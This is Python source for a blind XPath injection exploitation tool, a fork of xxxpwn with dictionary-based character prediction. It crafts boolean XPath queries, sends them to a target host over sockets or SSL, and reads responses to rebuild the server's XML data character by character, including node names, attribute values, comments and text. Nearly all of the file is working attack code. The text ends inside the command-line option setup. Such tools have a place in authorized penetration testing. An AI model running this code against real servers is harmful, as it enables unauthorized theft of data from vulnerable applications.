#!/usr/bin/env python
# -*- coding: latin1 -*-
# Notepad++ : Encoding -> UTF-8 without BOM. Tabs used for indentation
# vim: set nolist noexpandtab textwidth=0:

'''
A fork of xxxpwn (https://github.com/feakk/xxxpwn) adding further optimizations and tweaks. Uses
predictive text based on a dictionary of words/phrases vs frequencies of
occurence (incorporated from https://github.com/nyghtowl/Predictive_Txt_Ex)

Original description of xxxpwn:
XPath eXfiltration eXploitation Tool : https://github.com/feakk/xxxpwn
Designed for blind optimized XPath 1 injection attacks

xxxpwn uses a variety of XPath optimizations to query custom information from
a backend XML dodcument served from a location where XPath injection is present.
By default it will attempt to retrieve the entire remote database, though this
can be customized using a variety of options.

A number of previous discovered vulnerabilities have been provided as injection
files and target scripts for ease in getting started. This includes a sample
payload provided for the vulnerable application provided as part of xcat.py:
https://github.com/orf/xcat
'''

import argparse
import operator
import re
import math
import socket
import ssl
import string
import os
import sys
import time
import urllib
import cgi
import xml.dom.minidom
#import threading
import Queue
import binascii
import pickle
import trie

# Global Variables #
VERSION = "1.0.0_alpha"
ROOT_NODE = '/*[1]'  # Root node of a XML document
BAD_CHAR = '?'       # Placeholder for a character not in character set
NUM_FREQ_BANDS = 3
QI = Queue.Queue()   # Input Queue
QO = Queue.Queue()   # Output Queue
node_names = []      # Used for optimization of previous nodes
attribute_names = [] # Used for optimization of previous attributes
COUNT_OPTIMIZE = 30  # Optimize the character set if flag is enabled for any
                     # string larger than this. Best when over 30ish
root_nodes = root_comments = root_instructions = nodes_total = \
		attributes_total = comments_total = instructions_total = \
		text_total = elements_total = -1 # Used for optimization code


def print_dbg(msg):
	global args

	if args.debug:
		sys.stderr.write("DEBUG: %s\n" % msg)

def get_quoted_chars(chars):
	'''Handle both single and double quotes for a valid XPath query, without
	   changing the order of the characters'''
	SINGLE_QUOTE = "'"

	if SINGLE_QUOTE in chars:
		pt_a, pt_b = chars.split(SINGLE_QUOTE)
		use_chars = """concat('%s',"'",'%s')""" % \
				(encode_payload(pt_a), encode_payload(pt_b))
	else:
		use_chars = "'%s'" % encode_payload(chars)

	return use_chars

#def get_charsets_at_pos(str_list):
#	'''Return a list, each element, i, being the set of the characters at
#	   position i in each string in str_list'''
#	result = []
#	max_pos = max(map(lambda s: len(s), str_list))
#	for i in range(max_pos):
#		result.append(set(map(lambda s: s[i:i+1], str_list)))
#	return result

def get_chars_by_likelihood(so_far, chars):
	'''Group the given charset by likelihood of each character given value
	   so_far'''
	global trie_root

	print_dbg('Getting prediction for "%s"' % so_far)
	if trie_root is None:
		#return {0: chars}
		return [chars]

	pred_chars = dict.fromkeys(chars, 0)
	# User input could be a phrase
	pred_chars = trie.predict(trie_root, so_far, result=pred_chars,
			strip_so_far=True, add_freqs=True, no_new=True, max_new_chars=1)
	if ' ' in so_far:
		# Add predictions for the last word as well
		pred_chars = trie.predict(trie_root,
				re.split('(?:[^\w]|_)+', so_far)[-1], result=pred_chars,
				strip_so_far=True, add_freqs=True, no_new=True, max_new_chars=1)

	preferred = filter(lambda el: el > 0, pred_chars.values())
	if not preferred:
		# No candidates
		#return {0: chars}
		return [chars]

	# Group charactes in bands of likelihood
	max_freq = max(pred_chars.values())
	min_freq = min(preferred)
	step = (max_freq - min_freq)/NUM_FREQ_BANDS + 1
	get_band = lambda el: (el - min_freq) / step if el > 0 else 0
	freq_groups = dict.fromkeys(range(NUM_FREQ_BANDS+1), '')
	for char, freq in pred_chars.items():
		freq_groups[get_band(freq)] += char

	#return freq_groups
	return [chars for freq, chars in sorted(freq_groups.items(),
		key=operator.itemgetter(0), reverse=True) if chars]

def get_count_bst(expression, high=16, low=0):
	'''BST Number Discovery: Start at half of high, double until too high, then
	   check in middle of high and low, adjusting both as necessary.'''
	cmd = encode_payload("%s=0" % expression)
	node_test = attack(cmd)
	if node_test:
		return 0 # Expression is empty

	MAX_LENGTH = 10000
	TO_HIGH = False
	TO_LOW = False
	guess = (high + low)/2
	while guess != low and guess != high:
		if high >= MAX_LENGTH:
			sys.stderr.write("\n#Error: Surpassed max potential %s > %i#\n" % \
					(expression, MAX_LENGTH))
			return MAX_LENGTH
			#return 0
		cmd = encode_payload("%s<%i" % (expression, guess))
		node_test = attack(cmd)
		if node_test:
			if not TO_LOW:
				low /= 2
			TO_HIGH = True
			high = guess
		else:
			if not TO_HIGH:
				high *= 2
			TO_LOW = True
			low = guess
		guess = (high + low)/2
	return guess

def encode_payload(payload):
	'''Used to encode our characters in our BST for get_character_bst
	   function.'''
	global args
	if args.urlencode: # URL Encode
		payload = urllib.quote_plus(payload.encode('latin1'))
	elif args.htmlencode: # URL encode key characters
		payload = cgi.escape(payload.encode('latin1'))
	return payload


#def get_character_queue(inputQueue, outputQueue):
#	'''Function for handling an input and output Queue as a thread'''
#	global args
#	max_pos = {}
#	while True:
#		task = inputQueue.get()
#		(node, position) = task
#		# Don't send queries for positions beyond the string-len()
#		if not max_pos.has_key(node) or position < max_pos[node]:
#			#XXX likelihood charset
#			new_c = get_character_smart(node, position,
#					get_chars_by_likelihood('', args.character_set))
#		else:
#			assert new_c == ''
#
#		if new_c == '':
#			max_pos[node] = position
#		else:
#			outputQueue.put((position, new_c))
#		inputQueue.task_done()

def list_intersect(ordered_list, intersect):
	'''Fast way to remove characters from ordered_list that are not in
	   intersect preserving the order'''
	return ordered_list.translate(None, ordered_list.translate(None, intersect))

def remove_duplicates(ordered_list):
	'''Remove duplicates from ordered_list preserving the order'''
	if len(set(ordered_list)) == len(ordered_list):
		return ordered_list

	seen = set()
	return [c for c in ordered_list
			if c not in seen and bool(seen.add(c) or True)]

def to_lower(node):
	global args
	if args.use_lowercase:
		for r in string.uppercase:
			node = node.replace(r, '')
		node = 'translate(%s,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")' % node
	return node

def split_http(data):
	newline = re.search(r'\r?\n', data)
	if newline is not None:
		newline = newline.string[newline.start():newline.end()]
	else:
		# Default to \r\n for line splitter
		newline = '\r\n'

	if re.search(newline*2, data) is not None:
		headers, body = re.split(newline*2, data, maxsplit=1)
	else:
		# No body present in request
		headers, body = data, ''

	#  return {'headers': headers, 'body': body, 'newline': newline}
	return headers, body, newline

def match_similar(node, node_set, definitely_matches=False):
	'''Initially, compare our node to the set of all previously discovered
	   nodes of its type. If we can write some XML-y intelligence, we should be
	   able to use XML logic queries to speed this up even further. For
	   example, we can establish sibling relationships, then child-of
	   relationships, etc.'''
	global args
	if not node_set:
		return None

	matches = node_set

	if args.normalize_space:
		node = 'normalize-space(%s)' % node

	thres_match_count = 8
	if args.prediscover_strlen and len(matches) >= thres_match_count:
		strlen = get_count_bst("string-length(%s)" % node, args.len_high, args.len_low)
		matches = [m for m in matches if len(m) == strlen]

	# If the number of potential nodes to compare is < 3, check each
	print_dbg('Matching similar nodes (total of %i)')
	if len(matches) < thres_match_count:
		for m in matches:
			res = attack(encode_payload("%s='%s'" % (node, m)))
			if res:
				return m
		return None

	# Otherwise check if any of them matches first
	if not definitely_matches:
		cmd = "2<1"
		for m in matches:
			cmd += " or %s='%s'" % (node, m)
		res = attack(encode_payload(cmd))
		if not res:
			return None

	# The node matches a previously recorded one, find the most unique
	# character position among the recorded ones and check against that property
	#TODO or string length, or contained character
	# Get a list, each element, i, being the set of the characters at position
	# i in each string in matches
	charsets = []
	for i in range(max(map(lambda m: len(m), matches))):
		charsets.append(set(map(lambda m: m[i:i+1], matches)))
	#charsets = get_charsets_at_pos(matches)
	print_dbg('Matching similar nodes (out of %i), charsets are:\n  %r' % \
			(len(matches), charsets))
	# Get the character at (one of) the most unique position(s), i.e. one with
	# the longest charset set
	check_pos, charset = max(enumerate(charsets), key=lambda s: len(s[1]))
	charset = ''.join(charset)
	assert len(charset) > 1 # must be at least 2, if len(node_set) > 1
	c = get_character_smart(node, check_pos+1, {0: charset})
	print_dbg('Matched character at pos %i: "%s"' % (check_pos, c))
	matches = [m for m in matches if m[check_pos:check_pos+1] == c]
	assert matches
	assert len(matches) < len(node_set) # we should have reduced it at least by 1

	if len(matches) == 1:
		return matches[0]

	return match_similar(node, matches, definitely_matches=True)

def get_character_bst(node, position, chars):
	'''Use BST by dividing across a character set until we find our matched
	   character.'''
	global args

	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
	chars = chars.translate(None, remove)
	node = to_lower(node)

	use_chars = get_quoted_chars(chars)
	cmd = "contains(%s,substring(%s,%i,1))" % (use_chars, node, position)
	#print_dbg("Command: %s" % cmd)
	res = attack(cmd)
	if not res:
		#return BAD_CHAR
		return None
	#local_req = 1

	while len(chars) > 0:
		if len(chars) == 1 and args.prediscover_strlen:
			break # definitely not beyond string-len(value)

		mid = int(math.ceil(len(chars)/float(2)))
		down = chars[:mid] # Bottom half of characters
		up = chars[mid:]   # Top half of characters
		chars = down # Search down list, top list will be empty at the end

		use_chars = get_quoted_chars(chars)

		if len(chars) == 1:
			# Last time, make sure the character is present. This is needed
			# since position may be > string-len(value) and since
			# contains('anything at all', '') always returns true.
			cmd = "%s=substring(%s,%i,1)" % (use_chars, node, position)
		else:
			cmd = "contains(%s,substring(%s,%i,1))" % (use_chars, node, position)
		
		#print_dbg("Command: %s" % cmd)
		res = attack(cmd)
		if res and len(chars) == 1:
			break
		elif not res:
			chars = up
		#local_req += 1

	return chars # will be '' if position is beyond string-len(value)

def get_character_smart(node, position, char_freq_groups):
	'''Group characters in frequency bands and use BST on each band.
	   char_freq_groups is a list of strings (character sets) in order or
	   likelihood.'''
	
	#  for band, chars in sorted(char_freq_groups.items(),
	#          key=operator.itemgetter(0), reverse=True):
	#	if not chars:
	#		continue
	band = len(char_freq_groups)
	for chars in char_freq_groups:
		print_dbg('Frequency band %i: trying character group "%r"' % (band, chars))
		new_c = get_character_bst(node, position, chars)
		if new_c is not None:
			break
		band -= 1

	if new_c is None:
		sys.stderr.write("\n#Error: " + \
				"%s at postion %i is not in provided character set#\n" % \
				(node, position))
		sys.stdout.flush()
		new_c = BAD_CHAR
	return new_c

def get_value_bst(node, count):
	'''Tie BST String-Length with BST Character Discovery and perform exception
	   handling.'''
	global args
	sys.stdout.flush()
	chars = args.character_set

	#TODO: Attempt pre-discovery stuff here, which somewhat implies we know
	#      what type 'node' is
	if args.normalize_space:
		node = 'normalize-space(%s)' % node

	if args.prediscover_strlen:
		strlen = get_count_bst("string-length(%s)" % node, args.len_high,
				args.len_low)
		if count is None:
			count = strlen
		else:
			count = min(count, strlen)

	if args.optimize_charset:
		if count is None:
			# check if the string-length > threshold
			optimize = bool(attack(encode_payload(
				"string-length(%s)>=%i" % (node, COUNT_OPTIMIZE))))
		else:
			optimize = (count >= COUNT_OPTIMIZE)
		if optimize:
			chars = xml_optimize_character_set_node(node, chars)

	value = ''
	#if args.threads == 0: # Threading disabled
	if True:
		pos = 1
		while True and (count is None or pos <= count):
			new_c = get_character_smart(node, pos,
					get_chars_by_likelihood(value, chars))
			if new_c == '':
				assert not args.prediscover_strlen
				break
			value += new_c
			pos += 1
		return value

	assert False # MT not working yet
	# Handle multi-threading
	#XXX count is None
	#for p in range(1, count+1):
	#	# Put each character on queue
	#	QI.put((node, p))

	## Prealocate a character list, so the order is preserved
	#value = [BAD_CHAR] * count
	#left = count
	#while left > 0:
	#	# Block to prevent loop spinning
	#	tup = QO.get(True, None) 
	#	left -= 1
	#	value[tup[0]-1] = tup[1]
	#	QO.task_done()
	#value = ''.join(value)

	#return value

def get_xml_details():
	'''Get global XML details including content of root path.'''
	global root_nodes
	global root_comments
	global root_instructions
	global nodes_total
	global attributes_total
	global comments_total
	global instructions_total
	global text_total
	global elements_total
	global args

	xml_content = ''
	# Slight optimization here if the document is top heavy or doesn't contain
	# certain node types
	root_nodes = get_count_bst("count(/*)")
	root_comments = get_count_bst("count(/comment())")
	root_instructions = get_count_bst("count(/processing-instruction())")

	if args.global_count:
		nodes_total = get_count_bst("count(//*)")
		attributes_total = get_count_bst("count(//@*)")
		comments_total = get_count_bst("count(//comment())")
		instructions_total = get_count_bst("count(//processing-instruction())")
		text_total = get_count_bst("count(//text())")
		elements_total = nodes_total + attributes_total + comments_total + text_total
		print ("### XML Details: Root Nodes: %i, Root Comments: %i, " + \
				"Root Instructions: %i, Total Nodes: %i, Attributes: %i, " + \
				"Comments: %i, Instructions: %i, Text: %i, Total: %i ###") % \
				(root_nodes, root_comments, root_instructions, nodes_total,
						attributes_total, comments_total, instructions_total,
						text_total, elements_total)

	if args.no_root:
		return xml_content

	if not args.no_comments:
		for c in range(1, root_comments+1):
			comments_total -= 1
			comment = get_value_bst("/comment()[%s]" % (c), args.max_cont_len)
			xml_content += ("<!--%s-->" % comment)
			sys.stdout.write("<!--%s-->" % comment)

	if not args.no_processor:
		for i in range(1, root_instructions+1):
			instructions_total -= 1
			instruction = get_value_bst("/processing-instruction()[%s]" % (i),
					args.max_cont_len)
			xml_content += ("<?%s?>" % instruction)
			sys.stdout.write("<?%s?>" % instruction)

	return xml_content

def get_xml_bst(node, level=0):
	'''Process an XML tree starting from a given node. If given the ROOT node,
	   this will process an entire XML document.'''
	global args
	global root_nodes
	global root_comments
	global root_instructions
	global nodes_total
	global attributes_total
	global comments_total
	global instructions_total
	global text_total
	xml_content = ''
	if nodes_total == 0:
		return ''

	if level >= len(node_names):
		node_names.append(set([]))
	if level >= len(attribute_names):
		attribute_names.append(set([]))

	node_name = None
	if args.xml_match:
		node_name = match_similar("name(%s)" % node, node_names[level])
	if not node_name:
		node_name = get_value_bst("name(%s)" % node, args.max_name_len)
		node_names[level].add(node_name) # Add to set

	xml_content += ("<%s" % (node_name))
	sys.stdout.write("<%s" % (node_name.encode('latin1')))
	child_count = attribute_count = comment_count = instruction_count = text_count = 0

	if not args.no_attributes:
		if attributes_total != 0:
			attribute_count = get_count_bst("count(%s/@*)" % node)
		for a in range(1, attribute_count+1):
			attributes_total -= 1

			attribute_name = None
			if args.xml_match:
				attribute_name = match_similar("name(%s/@*[%i])" % (node, a),
						attribute_names[level])
			if not attribute_name:
				attribute_name = get_value_bst("name(%s/@*[%i])" % (node, a),
						args.max_name_len)
				attribute_names[level].add(attribute_name)

			if not args.no_values:
				attribute_value = get_value_bst("%s/@*[%i]" % (node, a),
						args.max_cont_len)
				xml_content += (' %s="%s"' % (attribute_name, attribute_value))
				sys.stdout.write(' %s="%s"' % (attribute_name.encode('latin1'),
					attribute_value.encode('latin1')))
			else:
				xml_content += (' %s' % (attribute_name))
				sys.stdout.write(' %s' % (attribute_name.encode('latin1')))
	xml_content += (">")
	sys.stdout.write(">")


	if not args.no_comments:
		if comments_total != 0:
			comment_count = get_count_bst("count(%s/comment())" % node)
		for c in range(1, comment_count+1):
			comments_total -= 1
			comment = get_value_bst("%s/comment()[%s]" % (node, c), args.max_cont_len)
			xml_content += ("<!--%s-->" % comment)
			sys.stdout.write("<!--%s-->" % comment.encode('latin1'))

	if not args.no_processor:
		if instructions_total != 0:
			instruction_count = \
					get_count_bst("count(%s/processing-instruction())" % node)
		for i in range(1, instruction_count+1):
			nodes_total -= 1
			instructions_total -= 1
			instruction = get_value_bst("%s/processing-instruction()[%s]" \
					% (node, i), args.max_cont_len)
			xml_content += ("<?%s?>" % instruction)
			sys.stdout.write("<?%s?>" % instruction.encode('latin1'))

	if not args.no_child:
		if nodes_total != 0:
			child_count = get_count_bst("count(%s/*)" % node)
		for c in range(1, child_count+1):
			xml_content += get_xml_bst("%s/*[%s]" % (node, c), level+1)
			nodes_total -= 1

	if not args.no_text:
		if text_total != 0:
			text_count = get_count_bst("count(%s/text())" % node)
		for t in range(1, text_count+1):
			text_total -= 1
			text_value = get_value_bst("%s/text()[%i]" % (node, t),
					args.max_cont_len)
			if re.search('\S', text_value, re.MULTILINE):
				xml_content += ("%s" % text_value)
				sys.stdout.write("%s" % \
						text_value.replace('\n', '').encode('latin1'))

	xml_content += ("</%s>" % (node_name))
	sys.stdout.write("</%s>" % (node_name))
	return xml_content

def xml_search(string_literal):
	'''Enumerate over each type of node searching for a particular string.'''
	global args

	# Needs to be quoted with single/double quotes
	string_literal = "'%s'" % string_literal
	name_node = 'name(.)'
	node = '.'
	match = 'contains'
	if args.search_start:
		match = 'starts-with'

	if args.use_lowercase:
		string_literal = string_literal.lower()
		print "# Converting search string to lowercase %s #" % string_literal
		name_node = '''translate(name(),"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")'''
		node = '''translate(.,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")'''
		args.use_lowercase = False

	if not args.no_child: # Use the no_child parameter for node names
		node_count = get_count_bst('count(//*[%s(%s,%s)])' % \
				(match, name_node, string_literal))
		print "### Found %s in %i node name(s) ###" % \
				(string_literal, node_count)
		for n in range(1, node_count+1):
			node_name = get_value_bst('(name((//*[%s(%s,%s)])[%i]))' % \
					(match, name_node, string_literal, n), args.max_name_len)
			print node_name

	if not args.no_attributes:
		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % \
				(match, name_node, string_literal))
		print "### Found %s in %i attribute name(s) ###" % \
				(string_literal, attribute_count)
		for a in range(1, attribute_count+1):
			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
					(match, name_node, string_literal, a), args.max_name_len)
			attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
					(match, name_node, string_literal, a), args.max_cont_len)
			print '%s="%s"' % (attribute_name, attribute_value)

			'''# Assume they always want the value if they are searching for the name
			if not args.no_values:
				attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % \
						(match,name_node,string_literal,a), args.max_cont_len)
				print '%s="%s"' % (attribute_name, attribute_value)
			else:
				print '%s' % (attribute_name)
			'''


	# Moved this block out of the no_attributes above in order to have distinct searches
	if not args.no_values:
		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % \
				(match, node, string_literal))
		print "### Found %s in %i attribute value(s) ###" % \
				(string_literal, attribute_count)
		for a in range(1, attribute_count+1):
			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % \
					(match, node, string_literal, a), args.max_name_len)

			if not args.no_values:
				attribute_value = get_value_bst('((//@*[%s(%s,%s)])[%i])' % \
						(match, node, string_literal, a), args.max_cont_len)
				print '%s="%s"' % (attribute_name, attribute_value)
			else:
				print '%s' % (attribute_name)

	if not args.no_comments:
		comment_count = get_count_bst("count(//comment()[%s(%s,%s)])" % \
				(match, node, string_literal))
		print "### Found %s in %i comments(s) ###" % (string_literal, comment_count)
		for c in range(1, comment_count+1):
			comment = get_value_bst("(//comment()[%s(%s,%s)])[%i]" % \
					(match, node, string_literal, c), args.max_cont_len)
			print "<!--%s-->" % comment

	if not args.no_processor:
		instruction_count = get_count_bst("count(//processing-instruction()[%s(%s,%s)])" % \
				(match, node, string_literal))
		print "### Found %s in %i instruction(s) ###" % (string_literal, instruction_count)
		for i in range(1, instruction_count+1):
			instruction = get_value_bst("(//processing-instruction()[%s(%s,%s)])[%i]" % \
					(match, node, string_literal, i), args.max_cont_len)
			print "<?%s?>" % instruction

	if not args.no_text:
		text_count = get_count_bst("count(//text()[%s(%s,%s)])" % \
				(match, node, string_literal))
		print "### Found %s in %i text(s) ###" % (string_literal, text_count)
		for t in range(1, text_count+1):
			text = get_value_bst("(//text()[%s(%s,%s)])[%i]" % \
					(match, node, string_literal, t), args.max_cont_len)
			print "%s" % text


def xml_optimize_character_set_node(node, chars):
	present = ''
	for c in chars:
		if c == "'":
			cmd = 'contains(%s,"%s")' % (node, c)
		else:
			cmd = "contains(%s,'%s')" % (node, c)
		if attack(encode_payload(cmd)):
			present += c
	return present

def xml_optimize_character_set(chars):
	'''Optimize a character set by searching globally for each character in the
	   database'''
	global args

	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
	for r in remove: chars = chars.replace(r, '')

	present = ''
	for c in chars:
		if c == "'":
			cmd = '//*[contains(name(),"%s")] or //*[contains(.,"%s")] or //@*[contains(name(),"%s")] or //@*[contains(.,"%s")] or //comment()[contains(.,"%s")] or //processing-instruction()[contains(.,"%s")] or //text()[contains(.,"%s")]' % (c,c,c,c,c,c,c)
		else:
			cmd = "//*[contains(name(),'%s')] or //*[contains(.,'%s')] or //@*[contains(name(),'%s')] or //@*[contains(.,'%s')] or //comment()[contains(.,'%s')] or //processing-instruction()[contains(.,'%s')] or //text()[contains(.,'%s')]" % (c,c,c,c,c,c,c)
		if attack(encode_payload(cmd)):
			present += c

	sys.stdout.write("### Match set optimized from %i to %i characters: %s ###\n" % \
			(len(chars), len(present), repr(present)))
	return present


def attack(inject):
	'''Parses injection request, passes to socket, and attempts to match response.'''
	global args
	global REQUEST_COUNT

	print_dbg("Command: %s" % inject)
	is_http = False
	is_ip = bool(re.match('^([0-9]{1,3}\.){3}[0-9]{1,3}$', args.host))

	request = re.sub(r'\$INJECT', inject, args.inject_file)

	if re.match(r'.*\s+HTTP/[0-9]+\.[0-9]', request) is not None:
		is_http = True
		# It's HTTP, process headers
		headers, body, newline = split_http(request)

		# Automatically Update Host header if present and given on cmdline
		if not is_ip:
			headers = re.sub(r'^Host:.*', 'Host: %s' % args.host,
					headers, re.IGNORECASE | re.MULTILINE)
		# Automatically update Content-Length
		request = re.sub(r'^Content-Length:.*', 'Content-Length: %i' % len(body),
				request, re.IGNORECASE | re.MULTILINE)
		# Change Accept-Encoding header value to none if present - DC 4/14/14
		headers = re.sub(r'^Accept-Encoding:.*', 'Accept-Encoding: none',
				headers, re.IGNORECASE | re.MULTILINE)
		# Change Connection header value to close if present - DC 4/24/14
		if re.search(r'^Connection:', headers, re.IGNORECASE | re.MULTILINE):
			headers = re.sub(r'^Connection:.*', 'Connection: close',
					headers, re.IGNORECASE | re.MULTILINE)
		else:
			# Add Connection: close if no Connection header is present
			headers += newline + 'Connection: close'

		request = headers + newline*2 + body

	MAX = 10 # Number of retries
	s = None
	while not s:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			if args.use_ssl:
				s = ssl.wrap_socket(s)
			s.connect((args.host, args.port))
			#s.setblocking(0)
			s.send(request)
		except Exception as e:
			if MAX == 0:
				sys.stderr.write("### Max retries reached ###\n")
				raise e
			else:
				sys.stderr.write("### Connection Retry %i ###\n" % MAX)
			MAX -= 1
			s = None
			time.sleep(1)
	REQUEST_COUNT += 1 # Bump our global request count

	total = ''
	#TODO: we need a max time to read data, and a timeout for nonblocking
	#TODO: Use keep-alive to speed up this code, which will however require
	#      a rearchitecture and some processing for HTTP POST data size reading
	while True:
		data = s.recv(65534)
		if not data:
			break
		total += data
	data = total
	s.close()

	if is_http:
		headers, body, _ = split_http(data)
	else:
		headers = body = ''

	if args.match_type == 'length':
		# Search content length in headers (won't match unless HTTP)
		cont_len = re.search(r'^Content-Length:\s*([0-9]+)\s*$',
				headers, re.IGNORECASE | re.MULTILINE)
		try:
			cont_len = cont_len.groups()[0]
		except AttributeError as e:
			#  sys.stderr.write("No Content-Length in HTTP response headers")
			#  raise e
			cont_len = len(body) if is_http else len(data)

		found = args.match_op(cont_len, args.match) and not args.match_fail
	else:
		# Search regex
		if args.match_loc == 'head':
			match_data = headers
		elif args.match_loc == 'body':
			match_data = body
		else:
			match_data = data
		found = bool(re.search(args.match, match_data,
			args.match_case)) and not args.match_fail

	if args.example:
		print "### Request: ###\n%s" % request
		print "### Reply: ###\n%s" % request
		print "### Match: '%s' = %s ###" % (args.match, found)
	return found


if __name__ == "__main__":
	t1 = time.time()
	global REQUEST_COUNT
	REQUEST_COUNT = 0

	global trie_root # built after argument processing

	global args
	def pos_int(s):
		i = int(s)
		if i <= 0:
			raise ValueError,"invalid literal, must be > 0: '%s'" % s
		return i
	def nonneg_int(s):
		i = int(s)
		if i < 0:
			raise ValueError,"invalid literal, must be >= 0: '%s'" % s
		return i
		
	# http://docs.python.org/dev/library/argparse.html
	parser = argparse.ArgumentParser(prog='xxxpwn_smart', description="Read a remote XML file through an XPath injection vulnerability using optimized predictive text search")
	#  subparsers = parser.add_subparsers(dest='match_type', help='Choose how successful injection is detected. Commands accept more options, use <command> -h', title='Match type')
	subparsers = parser.add_subparsers(dest='match_type', title='Match type')

	# Regex match options
	parser_string = subparsers.add_parser('regex', help='Determine successful injection based on presence of regular expression in reply')
	parser_string.add_argument("match", help="Regular expression that is present on successful injection")
	parser_string.add_argument("--case", help="Perform case-sensitive string matches (default is insensitive)", dest="match_case", action='store_const', const=0, default=re.IGNORECASE)
	parser_string_group = parser_string.add_mutually_exclusive_group()
	parser_string_group.add_argument("--headers", help="For HTTP, search only in response headers (default is entire response)", dest="match_loc", action='store_const', const='head')
	parser_string_group.add_argument("--body", help="For HTTP, search only in response body (default is entire response)", dest="match_loc", action='store_const', const='body')

	# Content length match options
	parser_length = subparsers.add_parser('length', help='Determine successful injection based on content length')
	parser_length.add_argument("match", help="Content length of reply on successful injection", type=pos_int)
	parser_length_group = parser_length.add_mutually_exclusive_group()
	parser_length_group.add_argument("--min", help="Match on any content length greater than or equal to the given one (default is exact)", dest="match_op", action='store_const', const=operator.ge, default=operator.eq)
	parser_length_group.add_argument("--max", help="Match on any content length less than or equal to the given one (default is exact)", dest="match_op", action='store_const', const=operator.le, default=operator.eq)

	# Rest of positional arguments
	parser.add_argument("host", help="Hostname or IP to connect to", metavar='HOST')
	parser.add_argument("inject_file", help="File containing sample request with $INJECT as dynamic injection location (default is stdin)", type=argparse.FileType('rb'), default=sys.stdin, metavar='FILE')

	# Global options
	parser.add_argument("-V", "--version", help="Print version and exit", action='version', version=VERSION)
	parser.add_argument("--debug", help="Print debugging messages", action='store_true', dest='debug', default=False)
	parser.add_argument("-r", "--reverse-match", help="Make a positive match indicate a failed injection (default is successful)", dest="match_fail", action='store_true', default=False)
	parser.add_argument("-U", "--urlencode", help="URL encode key characters in payload (default is disabled)", dest="urlencode", action="store_true", default=False)
	parser.add_argument("-H", "--htmlencode", help="HTML Encode key characters in payload (default is disabled)", dest="htmlencode", action="store_true", default=False)
	parser.add_argument("-s", "--ssl", help="Use SSL for connection (default is off)", dest="use_ssl", action="store_true", default=False)
	parser.add_argument("-p", "--port", help="Port number (default is 80 or 443 if using SSL)", type=pos_int, dest="port", metavar='PORT')

	group_test = parser.add_argument_group('Retrieval options')
	group_test.add_argument("-e", "--example", help="Test injection with an example injection request", dest="example", metavar='PAYLOAD')
	group_test.add_argument("--summary", help="Print XML summary information only", dest="summary", action="store_true", default=False)
	group_test.add_argument("--max_name_length", help="Retrieve only up to N characters for every node/attribute name (default is full name)", type=nonneg_int, dest="max_name_len", metavar='N')
	group_test.add_argument("--max_content_length", help="Retrieve only up to N characters for every node/attribute content (default is full content)", type=nonneg_int, dest="max_cont_len", metavar='N')
	group_test.add_argument("--no_root", help="Disable accessing comments/instructions in root (default is enabled)", dest="no_root", action="store_true", default=False)
	group_test.add_argument("--no_comments", help="Disable accessing comments/instructions in retrieval (default is enabled)", dest="no_comments", action="store_true", default=False)
	group_test.add_argument("--no_processor", help="Disable accessing comments nodes (default is enabled)", dest="no_processor", action="store_true", default=False)
	group_test.add_argument("--no_attributes", help="Disable accessing attributes (default is enabled)", dest="no_attributes", action="store_true", default=False)
	group_test.add_argument("--no_values", help="Disable accessing attribute values (default is enabled)", dest="no_values", action="store_true", default=False)
	group_test.add_argument("--no_text", help="Disable accessing text nodes (default is enabled)", dest="no_text", action="store_true", default=False)
	group_test.add_argument("--no_child", help="Disable accessing child nodes (default is enabled)", dest="no_child", action="store_true", default=False)

	group_adv = parser.add_argument_group('Advanced options')
	parser_trie_dic_group = group_adv.add_mutually_exclusive_group()
	parser_trie_dic_group.add_argument("-d", "--dictionary", help="A delimited file containing words (column 1) and frequencies (column 2). (default is none, disable predictive search)", dest="trie_dic")
	parser_trie_dic_group.add_argument("-D", "--bin-dictionary", help="The .pickle file generated by us using a previous delimited ASCII dictionary (default is none, disable predictive search)", dest="trie_pickle")
	group_adv.add_argument("--trie-delim", help="Delimiter for trie dictionary file (default is a tab)", dest="trie_delim", default="\t")
	group_adv.add_argument("-l", "--lowercase", help="Optimize further by reducing injection to lowercase matches (default is off)", dest="use_lowercase", action="store_true", default=False)
	group_adv.add_argument("-g", "--global_count", help="Maintain global count of nodes", dest="global_count", action="store_true", default=False)
	group_adv.add_argument("-n", "--normalize_space", help="Normalize whitespace (default is off)", dest="normalize_space", action="store_true", default=False)
	group_adv.add_argument("-o", "--optimize_charset", help="Optimize character set globally and for any string length over %i" % COUNT_OPTIMIZE, dest="optimize_charset", action="store_true", default=False)
	group_adv.add_argument("-L", "--use_strlen", help="Find out the length of a value before querying it character by character. This may work better if not using prediction.", dest="prediscover_strlen", action="store_true", default=False)
	group_adv.add_argument("-x", "--xml_match", help="Match current nodes to previously recovered data", dest="xml_match", action="store_true", default=False)
	group_adv.add_argument("--len_low", help="Start guessing string lengths are at least N characters (default is 0)", type=nonneg_int, dest="len_low", default=0, metavar='N')
	group_adv.add_argument("--len_high", help="Start guessing string lengths are at most N characters (default is 16)", type=pos_int, dest="len_high", default=16, metavar='N')
	group_adv.add_argument("--start_node", help="Start recovery at given node (default is root node /*[1])", dest="start_node", default=ROOT_NODE, metavar='NODE')
	#group_adv.add_argument("-k", "--keep_alive", help="Use HTTP Keep Alives connections to speedup round-trip time", dest="keep_alive", action="store_true", default=False)
	group_adv.add_argument("-u", "--use_characters", help="Use given string for BST character discovery (default is printable characters)", dest="character_set", default=string.printable, metavar='CHARSET')
	group_adv.add_argument("--unicode", help="Include Unicode characters to search space", dest="unicode", action="store_true", default=False)
	#group_adv.add_argument("-t", "--threads", help="Parallelize attack using N threads (default is 1)", dest="threads", type=nonneg_int, default=0, metavar='N')
	group_adv.add_argument("--xpath2", help="Check for presence of XPath 2.0 functions", dest="xpath2", action="store_true", default=False)
